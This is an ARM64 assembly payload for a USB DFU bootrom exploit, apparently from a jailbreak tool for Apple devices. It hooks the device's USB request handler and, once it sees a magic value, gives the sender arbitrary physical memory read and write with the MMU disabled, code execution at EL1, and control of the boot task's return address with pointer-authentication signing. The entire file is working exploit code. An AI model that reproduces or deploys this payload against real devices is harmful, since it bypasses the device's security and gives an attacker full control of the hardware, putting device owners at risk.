//    __/\\\________________/\\\_____________________________________________________________
//     _\///\\\_____________\///\\\___________________________________________________________
//      ___\///\\\_____________\///\\\_________________________________________________________
//       _____\///\\\_____________\///\\\__________/\\/\\\\\\\___/\\____/\\___/\\__/\\\____/\\\_
//        _______\///\\\_____________\///\\\_______\/\\\/////\\\_\/\\\__/\\\\_/\\\_\///\\\/\\\/__
//         _________\///\\\_____________\///\\\_____\/\\\___\///__\//\\\/\\\\\/\\\____\///\\\/____
//          ___________\///\\\_____________\///\\\___\/\\\__________\//\\\\\/\\\\\______/\\\/\\\___
//           _____________\///\\\_____________\///\\\_\/\\\___________\//\\\\//\\\_____/\\\/\///\\\_
//            _______________\///________________\///__\///_____________\///__\///_____\///____\///__
//
//
//
// offsets are encoded at end of payload chunk (same page)
// to be populated at runtime based on CPID -> offset values in l41ka/src/device_offsets/
//
/// this could totally be in C, sorry! i just kinda felt like it!
//
// if you add any code to this you will need to adjust the exploits, we are sort of at size limits on this rn
//
// altho if you need more code you have more than enough primitive with this to throw crap in sram and run it

.globl _handler
_handler:	// (struct usb_device_request *request, uint8_t **io_buffer)

    stp		x22, x21, [sp, #-0x30]!
    stp		x20, x19, [sp, #0x10]
    stp		fp, lr, [sp, #0x20]
    mov		x19, x0

    adr		x8, _REQUEST_HOOKVAL
    ldr		w8, [x8]
    ldr		w9, [x0]
    cmp		w9, w8
    b.eq	_handle_message

// This is the function we replaced.
_handler_go_orig:
    ldp		fp, lr, [sp, #0x20]
    ldp		x20, x19, [sp, #0x10]
    ldp		x22, x21, [sp], #0x30

    adr		x9, _ORIG_REQUEST
    ldr		x9, [x9]
    br		x9
/// =-=-=-=>>> exit

_handle_message:
    adr		x8, _DFU_BASE
    ldr		x8, [x8]
    ldr		x10, [x8]

    /*
    struct message
    {
    uint64_t magic;
    uint32_t type;
    uint32_t reserved;
    uint64_t arg;
    uint64_t length;
    uint8_t body[MESSAGE_BODY_SIZE];
    } __attribute__((packed));
    */

    adr		x9, _PAWN_MAGIC
    ldr		x9, [x9]

    cmp		x10, x9
    b.ne	_handler_go_orig

    ldr		w10, [x8, #8]		// type, uint32_t
    ldr		x12, [x8, #16]		// arg, uint64_t
    ldr		x13, [x8, #24]		// length, uint64_t
    add		x14, x8, #32		// &body[0]

/// -- type checks
___check_read:
    cmp		w10, 'r'
    b.ne	___check_write

    mov		x0, x12		// msg->arg
    mov		x1, x14		// &msg->body
    mov		x2, x13		// msg->length

    bl		__copy
    b		__finish_usb_transfer

___check_write:
    cmp		w10, 'w'
    b.ne	___check_exec

    mov		x0, x14		// &msg->body
    mov		x1, x12		// msg->arg
    mov		x2, x13		// msg->length

    bl		__copy
    b		__finish_usb_transfer

___check_exec:
    orr		w9, w10, #0x20
    cmp		w9, 'x'
    b.ne	___check_boot_lr
    tst		w10, #0x20
    cset	w2, eq

    mov		x0, x12		// msg->arg
    mov		x1, x14		// &msg->body

    bl		__execute
    b		__finish_usb_transfer

___check_boot_lr:
    cmp		w10, 'b'
    b.ne	__finish_usb_transfer

    mov		x0, x12		// msg->arg
    mov		x1, x14		// &msg->body

    bl		__set_boot_lr_el1
    b		__finish_usb_transfer

// respond to the device
__finish_usb_transfer:	// (int32_t direction, int64_t dfu_base, int32_t len, int64_t zero)
    mov		x0, #0x80
    adr		x1, _DFU_BASE
    ldr		x1, [x1]
    ldrh	w2, [x19, #6]
    mov		x3, xzr

    ldp		fp, lr, [sp, #0x20]
    ldp		x20, x19, [sp, #0x10]
    ldp		x22, x21, [sp], #0x30

    adr		x18, _FINISH_TRANSFER
    ldr		x18, [x18]
    br		x18
/// =-=-=-=>>> exit


/// ----
// / we turn off MMU during reads and writes to just skip dealing with it
// /    as a consequence, all reads and writes are to phys.
/// ====
__copy:	// x0 = &src
		// x1 = &dst
		// x2 = len

    stp		x19, lr, [sp, #-0x10]!
    mov		x19, x0		// &src
    mov		x20, x1		// &dst
    mov		x21, x2

    bl		__enter_el1

    adr		x10, ___copy_mmu_off
    at		s1e1r, x10
    isb
    mrs		x12, par_el1
    bfi		x12, x10, #0, #12
    ubfx	x10, x12, #0, #52

    adr		x11, ___copy_mmu_on
    mov		x9, #0xc4

    dsb		sy
    mrs		x22, sctlr_el1
    bic		x8, x22, #0x1
    msr		elr_el1, x10
    msr		spsr_el1, x9
    msr		sctlr_el1, x8
    eret

___copy_mmu_off:
    mov		x0, x19
    mov		x1, x21
    bl		___cache_range
    mov		x0, x20
    mov		x1, x21
    bl		___cache_range
    dsb		sy

___copy_loop:
    cbz		x21, ___copy_loop_done

    ldrb	w8, [x19], #0x1
    strb	w8, [x20], #0x1
    subs	x21, x21, #0x1
    b.ne	___copy_loop

___copy_loop_done:
    dsb		sy
    ic		iallu
    dsb		sy
    msr		elr_el1, x11
    msr		spsr_el1, x9
    msr		sctlr_el1, x22
    eret

___copy_mmu_on:
    ldp		x19, lr, [sp], #0x10
    b		__leave_el1


___cache_range:	// x0 = physical address
				// x1 = length
    cbz		x1, ___cache_range_done
    add		x2, x0, x1
    and		x0, x0, #~0x3f

___cache_range_loop:
    dc		civac, x0
    add		x0, x0, #0x40
    cmp		x0, x2
    b.lo	___cache_range_loop

___cache_range_done:
    ret


/// ====
__execute:	// x0 = destination
			// x1 = &body, first 8 qwords are x0-x7 args and return slots
			// x2 = bool el1 - elevate if this is set

    stp		x19, lr, [sp, #-0x10]!
    mov		x19, x1
    mov		x20, x2
    mov		x14, x0
    cbz		x20, ___execute_call
    svc		#0

___execute_call:
    mov		x15, x19
    ldp		x0, x1, [x15], #0x10
    ldp		x2, x3, [x15], #0x10
    ldp		x4, x5, [x15], #0x10
    ldp		x6, x7, [x15], #0x10
    blr		x14

    mov		x15, x19
    stp		x0, x1, [x15], #0x10
    stp		x2, x3, [x15], #0x10
    stp		x4, x5, [x15], #0x10
    stp		x6, x7, [x15], #0x10
    ldp		x19, lr, [sp], #0x10
    cbz		x20, ___execute_return
    b		__leave_el1

___execute_return:
    ret


/// ====
__set_boot_lr_el1:	// x0 = target LR
					// x1 = &body

    stp		fp, lr, [sp, #-0x10]!
    svc		#0
    mov		x15, x1
    cbz		x0, ___set_boot_lr_failed

    adr		x8, _MAIN_TASK_STACK_LR
    ldr		x8, [x8]
    adr     x9, _PAC
    ldr     x9, [x9]
    cbz     x9, ___go

    // sign lr
    add		x1, x8, #0x8
    pacib	x0, x1

___go:
    str		x0, [x8]
    dsb		sy
    isb
    mov		x0, #0x1
    b		___set_boot_lr_done

___set_boot_lr_failed:
    str		xzr, [x15]

___set_boot_lr_done:
    str		x0, [x15]
    ldp		fp, lr, [sp], #0x10
    b		__leave_el1


/// ====
__enter_el1: // ()
    svc		#0
    ret

__leave_el1: // ()
	adr		x8, _PAC // HACK
	ldr		x8, [x8]
	cbnz	x8, ___leave_el1_rom

	stp		fp, lr, [sp, #-0x10]!

___leave_el1_rom:
	adr		x8, _LEAVE_EL1
	ldr		x8, [x8]
	br		x8

_REQUEST_HOOKVAL:
/* 
clang emits a check for part of this as:

cmn     w9, #0x5f
ccmp    w8, #0x2, #0, eq
b.eq    0x4c

which i think is very interesting!
*/
.word		0xFFFF02A1
.word		0x00000000

_PAWN_MAGIC: // o/
.quad		0x2D2A4E5741502A2D


// tweakables
_DFU_BASE:
.quad		0
_ORIG_REQUEST:
.quad		0
_FINISH_TRANSFER:
.quad		0
_MAIN_TASK_STACK_LR:
.quad		0
_LEAVE_EL1:
.quad		0
_PAC:
.quad       0
